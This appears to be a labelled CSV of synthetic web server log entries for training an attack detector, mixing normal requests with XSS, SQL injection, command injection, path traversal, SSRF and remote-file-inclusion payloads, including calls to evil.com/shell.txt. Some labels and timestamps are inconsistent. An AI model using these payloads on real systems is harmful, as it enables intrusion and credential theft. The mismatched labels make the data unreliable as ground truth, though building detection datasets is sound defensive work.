logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-03T07:33:42+09:00,10.0.0.138,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,python-requests/2.35,True,sql_injection,2025-05-03T13:06:35+09:00,script,-
2025-05-04T02:38:34+09:00,198.172.48.80,POST,/diag/ping?host=127.0.0.1;cat+/etc/passwd,500,sqlmap/1.7.4#stable,True,command_injection,2025-05-13T03:32:41+09:00,script,-
2025-05-03T15:38:41+09:00,10.0.0.42,POST,/images/....//....//etc/passwd,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,True,directory_traversal,2025-05-04T18:51:08+09:00,browser,https://google.com/search?q=example
2025-05-06T17:21:12+09:00,192.168.0.205,GET,/signup?page=2,304,Twitterbot/1.0,False,normal,2025-05-06T14:00:12+09:00,crawler,https://google.com/search?q=example
2025-05-11T00:08:58+09:00,192.168.0.68,POST,/signup?page=5,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-02T09:26:16+09:00,mobile_browser,-
2025-05-01T07:55:11+09:00,10.0.0.108,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,wpscan/3.8.23,True,xss,2025-05-07T06:35:06+09:00,pentest_tool,-
2025-05-04T15:50:40+09:00,192.168.0.235,POST,/products?page=4,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",False,normal,2025-05-01T22:04:14+09:00,browser,https://example.com/prev
2025-05-06T20:55:32+09:00,192.168.0.218,POST,/api/v1/user/35,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0,False,normal,2025-05-02T16:31:07+09:00,browser,-
2025-05-05T01:38:21+09:00,40.50.191.167,GET,/ping?host=8.8.8.8;rm+-rf+/tmp/*,500,python-requests/2.25.1,True,command_injection,2025-05-11T20:19:01+09:00,script,-
2025-05-11T13:36:10+09:00,10.0.0.8,POST,/../../../../etc/passwd,200,BurpSuite Community/2025.4,True,directory_traversal,2025-05-05T14:45:37+09:00,pentest_tool,https://twitter.com/
2025-05-13T05:02:44+09:00,119.70.16.238,GET,/index.php?page=../../../../etc/shadow%00,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),True,directory_traversal,2025-05-14T05:46:47+09:00,browser,-
2025-05-01T00:12:51+09:00,76.75.196.59,BADTLS,\x16\x03\x01\x00\df\x01\x00…,400,-,True,tls_probe,2025-05-10T13:30:16+09:00,pentest_tool,-
2025-05-01T07:37:42+09:00,192.168.0.126,GET,/products,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-03T12:02:32+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-09T10:39:52+09:00,178.100.219.81,GET,/ping?host=8.8.8.8;rm+-rf+/tmp/*,500,Nikto/2.5.0,True,command_injection,2025-05-08T10:52:48+09:00,pentest_tool,-
2025-05-01T15:58:50+09:00,172.16.0.46,GET,/comment?msg=<script>alert('x')</script>,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,True,xss,2025-05-03T14:33:30+09:00,browser,-
2025-05-03T13:53:09+09:00,138.226.47.175,POST,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-01T05:59:23+09:00,browser,https://example.com/
2025-05-09T15:38:15+09:00,10.0.0.83,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,OWASP ZAP,True,sql_injection,2025-05-06T12:12:30+09:00,pentest_tool,-
2025-05-05T22:16:46+09:00,10.0.0.159,GET,/login.php?username=admin' OR '1'='1'--&password=pw,403,wpscan/3.8.23,True,sql_injection,2025-05-02T16:04:11+09:00,pentest_tool,-
2025-05-11T08:28:04+09:00,10.0.0.226,POST,/login.php%253Fusername%253Dadmin%2527%2520OR%2520%25271%2527%253D%25271%2527--%2526password%253Dpw,404,curl/8.8,True,sql_injection,2025-05-04T16:38:43+09:00,script,-
2025-05-10T16:48:22+09:00,10.0.0.229,GET,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,True,command_injection,2025-05-03T12:31:04+09:00,browser,https://google.com/search?q=example
2025-05-09T08:24:24+09:00,192.168.0.206,GET,/search?q=shoes,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-03T10:23:14+09:00,mobile_browser,https://twitter.com/
2025-05-13T15:42:34+09:00,192.168.0.249,GET,/about,200,curl/8.6,False,normal,2025-05-04T21:55:24+09:00,script,https://bing.com/search?q=foo
2025-05-10T17:07:26+09:00,10.0.0.101,POST,/proxy?url=http://169.254.169.254/latest/meta-data/,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",True,ssrf_rfi,2025-05-05T10:59:09+09:00,browser,-
2025-05-08T13:15:38+09:00,10.0.0.162,GET,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,403,Metasploit/6.4,True,ssrf_rfi,2025-05-07T14:59:17+09:00,pentest_tool,https://google.com/search?q=example
2025-05-09T02:57:06+09:00,230.10.155.62,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-04T21:02:25+09:00,browser,-
2025-05-13T08:30:59+09:00,30.31.246.179,GET,/,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-12T22:47:58+09:00,browser,-
2025-05-02T15:04:05+09:00,10.0.0.224,GET,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Edge/106.0,True,xss,2025-05-01T11:26:31+09:00,browser,-
2025-05-09T12:33:04+09:00,10.0.0.254,POST,/images/....//....//etc/passwd,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",True,directory_traversal,2025-05-03T16:41:55+09:00,browser,-
2025-05-01T20:51:34+09:00,192.168.0.32,GET,/css/style.css,302,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-03T09:04:53+09:00,mobile_browser,-
2025-05-02T06:12:35+09:00,6.132.31.61,GET,/contact,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-02T15:49:24+09:00,browser,https://example.com/
2025-05-01T21:24:09+09:00,192.168.0.84,GET,/products?page=1,200,"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",False,normal,2025-05-01T15:29:31+09:00,mobile_browser,-
2025-05-13T09:07:06+09:00,192.168.0.111,POST,/api/v1/user/35?page=2,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,False,normal,2025-05-02T19:57:00+09:00,browser,-
2025-05-01T13:14:30+09:00,10.0.0.168,POST,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",True,command_injection,2025-05-07T09:53:32+09:00,browser,-
2025-05-08T13:54:58+09:00,10.0.0.207,GET,/images/....//....//etc/passwd,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",True,directory_traversal,2025-05-06T08:05:44+09:00,browser,-
2025-05-12T13:28:35+09:00,10.0.0.81,GET,/search?q=%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,200,BurpSuite Community/2025.4,True,sql_injection,2025-05-07T10:09:51+09:00,pentest_tool,-
2025-05-14T17:00:07+09:00,10.165.101.76,POST,/login?username=user774&password=pass5724,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",False,normal,2025-05-14T17:00:07+09:00,browser,-
2025-05-07T21:25:20+09:00,192.168.0.104,POST,/,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-03T23:58:21+09:00,mobile_browser,https://google.com/search?q=example
2025-05-09T08:55:03+09:00,10.0.0.148,POST,/images/....//....//etc/passwd,403,Nessus v10.5,True,directory_traversal,2025-05-04T13:59:22+09:00,pentest_tool,-
2025-05-05T16:36:16+09:00,10.0.0.164,GET,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,200,wpscan/3.8.23,True,xss,2025-05-02T12:56:37+09:00,pentest_tool,-
2025-05-09T13:31:21+09:00,192.168.0.244,POST,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,False,normal,2025-05-01T15:16:52+09:00,browser,https://google.com/search?q=example
2025-05-02T17:22:09+09:00,192.168.0.6,GET,/css/style.css?page=5,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",False,normal,2025-05-04T13:19:28+09:00,browser,https://www.facebook.com/
2025-05-06T22:10:56+09:00,192.168.0.113,GET,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Edge/109.0,False,normal,2025-05-03T20:57:46+09:00,browser,-
2025-05-13T16:00:20+09:00,10.0.0.6,GET,/comment?msg=<script>alert('x')</script>,403,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,xss,2025-05-06T14:04:01+09:00,crawler,-
2025-05-10T15:26:11+09:00,192.168.0.171,GET,/signup,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-02T21:13:13+09:00,mobile_browser,https://google.com/search?q=example
2025-05-07T08:38:20+09:00,192.168.0.253,POST,/home,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-06T11:32:15+09:00,mobile_browser,-
2025-05-04T20:24:51+09:00,172.16.0.247,GET,/signup,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0,False,normal,2025-05-03T16:38:31+09:00,browser,https://google.com/search?q=example
2025-05-07T08:54:12+09:00,10.193.130.140,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-07T08:54:12+09:00,unknown,-
2025-05-08T00:53:20+09:00,10.0.0.62,GET,/,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0,False,normal,2025-05-01T15:28:09+09:00,browser,https://bing.com/search?q=foo
2025-05-04T18:05:27+09:00,168.167.84.138,GET,/comment?msg=<svg onload=alert(1)>,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,xss,2025-05-14T09:57:28+09:00,browser,-
2025-05-10T13:00:47+09:00,192.168.0.91,POST,/,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-02T06:32:48+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-04T20:59:17+09:00,192.168.0.248,GET,/products,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",False,normal,2025-05-03T23:14:59+09:00,browser,-
2025-05-04T10:57:23+09:00,42.67.186.109,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,403,Mozilla/5.0 (X11; Linux x86_64),True,directory_traversal,2025-05-03T23:10:04+09:00,browser,-
2025-05-13T00:55:26+09:00,10.0.0.192,POST,/proxy?url=http://169.254.169.254/latest/meta-data/,500,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),True,ssrf_rfi,2025-05-06T23:45:20+09:00,crawler,-
2025-05-09T15:46:01+09:00,10.0.0.61,POST,/load?file=http://evil.com/shell.txt,403,sqlmap/1.7#stable,True,ssrf_rfi,2025-05-04T17:27:46+09:00,pentest_tool,-
2025-05-08T04:12:32+09:00,42.126.202.195,POST,/static/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-12T11:21:08+09:00,browser,-
2025-05-06T08:58:08+09:00,192.168.0.47,GET,/signup,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,False,normal,2025-05-04T09:18:05+09:00,browser,https://twitter.com/
2025-05-10T01:38:12+09:00,192.168.0.205,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,False,normal,2025-05-04T13:19:16+09:00,browser,-
2025-05-13T00:39:40+09:00,192.168.0.142,GET,/products/4.html,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-04T21:51:55+09:00,browser,-
2025-05-01T08:18:28+09:00,192.168.0.185,GET,/products/4.html,302,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-01T20:25:49+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-14T07:58:36+09:00,128.125.209.116,BADTLS,\x16\x03\x01\x00\a1\x01\x00…,400,-,True,tls_probe,2025-05-14T03:00:26+09:00,pentest_tool,-
2025-05-14T15:12:57+09:00,62.173.215.169,BADTLS,%255Cx16%255Cx03%255Cx01%255Cx00%255Cx82%255Cx01%255Cx00...,403,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),True,tls_probe,2025-05-01T09:37:19+09:00,crawler,-
2025-05-10T13:21:29+09:00,192.168.0.81,POST,/products/4.html,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",False,normal,2025-05-07T06:27:37+09:00,browser,https://example.com/prev
2025-05-02T21:35:45+09:00,192.168.0.65,GET,/css/style.css,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0,False,normal,2025-05-07T22:41:17+09:00,browser,https://www.facebook.com/
2025-05-09T01:18:40+09:00,192.168.0.14,GET,/js/app.js?page=5,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0,False,normal,2025-05-01T17:17:13+09:00,browser,https://www.facebook.com/
2025-05-08T07:27:39+09:00,192.168.0.184,POST,/about,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-06T17:20:39+09:00,mobile_browser,-
2025-05-12T13:36:59+09:00,192.168.0.236,POST,/about,304,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Edge/103.0,False,normal,2025-05-04T12:52:01+09:00,browser,https://google.com/search?q=example
2025-05-04T15:06:48+09:00,192.168.0.205,GET,/products?page=1,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Edge/100.0,False,normal,2025-05-02T19:26:28+09:00,browser,-
2025-05-04T00:23:04+09:00,10.0.0.217,GET,/comment?msg=<script>alert('x')</script>,200,curl/8.0,True,xss,2025-05-07T11:48:21+09:00,script,-
2025-05-08T04:10:44+09:00,221.117.251.104,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-02T23:01:37+09:00,browser,https://example.com/
2025-05-07T15:59:44+09:00,192.168.0.233,POST,/about,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",False,normal,2025-05-07T10:07:34+09:00,browser,https://google.com/search?q=example
2025-05-06T08:16:24+09:00,10.0.0.78,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,200,python-requests/2.20,True,ssrf_rfi,2025-05-06T22:16:08+09:00,script,-
2025-05-14T12:28:37+09:00,10.0.0.24,POST,/search?q=<script>alert('x')</script>,200,sqlmap/1.7#stable,True,xss,2025-05-02T13:34:58+09:00,pentest_tool,-
2025-05-09T07:58:59+09:00,192.168.0.191,GET,/,302,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T06:00:37+09:00,mobile_browser,https://twitter.com/
2025-05-11T09:57:10+09:00,192.168.0.122,POST,/products,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T18:31:13+09:00,mobile_browser,-
2025-05-07T16:09:37+09:00,10.0.0.99,GET,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0,True,ssrf_rfi,2025-05-07T11:07:37+09:00,browser,-
2025-05-14T20:52:19+09:00,183.204.13.97,GET,/contact,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-05T09:49:08+09:00,browser,-
2025-05-02T13:51:03+09:00,10.0.0.19,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,404,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),True,ssrf_rfi,2025-05-02T18:36:22+09:00,crawler,-
2025-05-08T16:39:03+09:00,192.168.0.24,POST,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-03T10:52:18+09:00,browser,https://www.facebook.com/
2025-05-10T16:19:50+09:00,72.71.242.202,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,200,wpscan/3.8.23,True,tls_probe,2025-05-02T07:51:16+09:00,pentest_tool,-
2025-05-09T12:31:14+09:00,95.108.118.89,POST,/static/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-14T20:42:35+09:00,browser,-
2025-05-11T15:47:43+09:00,192.168.0.38,POST,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Edge/106.0,False,normal,2025-05-05T08:50:05+09:00,browser,https://bing.com/search?q=foo
2025-05-01T15:03:38+09:00,51.123.77.159,BADTLS,\x16\x03\x01\x00\b6\x01\x00…,400,-,True,tls_probe,2025-05-11T07:24:28+09:00,pentest_tool,-
2025-05-05T21:18:55+09:00,10.95.49.18,POST,/login?username=user320&password=pass1603,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",False,normal,2025-05-05T21:18:55+09:00,browser,https://example.com/
2025-05-04T16:32:55+09:00,10.0.0.167,GET,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",True,command_injection,2025-05-03T20:47:09+09:00,browser,-
2025-05-09T08:11:10+09:00,192.168.0.140,POST,/products?page=2,200,curl/8.4,False,normal,2025-05-04T11:31:51+09:00,script,https://bing.com/search?q=foo
2025-05-12T17:08:55+09:00,10.0.0.14,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,curl/7.6,True,xss,2025-05-01T08:15:50+09:00,script,-
2025-05-01T20:31:29+09:00,10.0.0.21,GET,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,500,BurpSuite Community/2025.4,True,ssrf_rfi,2025-05-02T21:58:10+09:00,pentest_tool,https://bing.com/search?q=foo
2025-05-01T03:29:57+09:00,158.115.19.199,GET,/static/js/app.js,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-10T21:41:43+09:00,browser,https://example.com/
2025-05-09T01:57:20+09:00,10.0.0.98,POST,/admin/backup?file=config;echo+x,200,Twitterbot/1.0,True,command_injection,2025-05-01T14:45:20+09:00,crawler,-
2025-05-13T21:23:12+09:00,192.168.0.225,GET,/api/v1/user/35,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Edge/101.0,False,normal,2025-05-05T14:32:41+09:00,browser,https://example.com/prev
2025-05-04T07:37:54+09:00,192.168.0.197,GET,/about,404,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-04T13:37:44+09:00,crawler,https://google.com/search?q=example
2025-05-13T21:30:09+09:00,117.168.0.195,GET,"/search?q=1' UNION SELECT username, password FROM users --",200,Mozilla/5.0,True,sql_injection,2025-05-09T13:46:54+09:00,browser,-
2025-05-03T08:05:08+09:00,249.133.247.80,GET,"/search?q=1' UNION SELECT username, password FROM users --",200,sqlmap/1.7.4#stable,True,sql_injection,2025-05-11T13:30:08+09:00,pentest_tool,-
2025-05-14T00:01:37+09:00,10.0.0.26,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,200,sqlmap/1.7#stable,True,ssrf_rfi,2025-05-02T13:33:13+09:00,pentest_tool,-
2025-05-01T15:59:15+09:00,192.168.0.182,POST,/signup?page=5,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-02T12:42:30+09:00,crawler,-
2025-05-10T10:29:47+09:00,170.76.139.189,BADTLS,\x16\x03\x01\x00\9a\x01\x00…,400,-,True,tls_probe,2025-05-02T16:10:56+09:00,pentest_tool,-
2025-05-01T21:15:04+09:00,192.168.0.83,POST,/products/4.html,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",False,normal,2025-05-04T10:14:14+09:00,browser,https://www.facebook.com/
2025-05-04T22:57:37+09:00,192.168.1.10,GET,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0,False,normal,2025-05-02T18:59:01+09:00,browser,https://bing.com/search?q=foo
2025-05-04T09:39:36+09:00,15.2.78.172,GET,/include?template=http://evil.com/shell.txt,504,curl/7.68.0,True,ssrf_rfi,2025-05-11T20:29:29+09:00,script,-
2025-05-13T08:24:23+09:00,10.0.0.230,GET,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,403,python-requests/2.80,True,command_injection,2025-05-03T22:45:04+09:00,script,-
2025-05-01T21:16:45+09:00,236.72.251.20,BADTLS,\x16\x03\x01\x00\af\x01\x00…,400,-,True,tls_probe,2025-05-12T05:58:44+09:00,pentest_tool,-
2025-05-03T00:05:08+09:00,192.168.0.46,GET,/login?page=2,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-03T16:18:19+09:00,mobile_browser,-
2025-05-04T09:14:31+09:00,10.0.0.150,GET,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,403,BurpSuite Community/2025.4,True,command_injection,2025-05-05T13:33:14+09:00,pentest_tool,-
2025-05-10T09:34:45+09:00,86.18.14.221,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,200,Metasploit/6.4,True,tls_probe,2025-05-05T12:08:21+09:00,pentest_tool,https://google.com/search?q=example
2025-05-14T13:11:25+09:00,10.0.0.69,POST,/ping?host=8.8.8.8;cat+/etc/passwd,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Edge/107.0,True,command_injection,2025-05-05T11:21:58+09:00,browser,-
2025-05-09T22:38:25+09:00,85.57.72.116,GET,/contact,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-03T14:14:05+09:00,browser,https://example.com/
2025-05-06T22:12:55+09:00,10.252.30.6,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-06T22:12:55+09:00,unknown,-
2025-05-13T01:01:28+09:00,192.168.0.111,GET,/signup,200,curl/7.8,False,normal,2025-05-03T19:58:27+09:00,script,https://www.facebook.com/
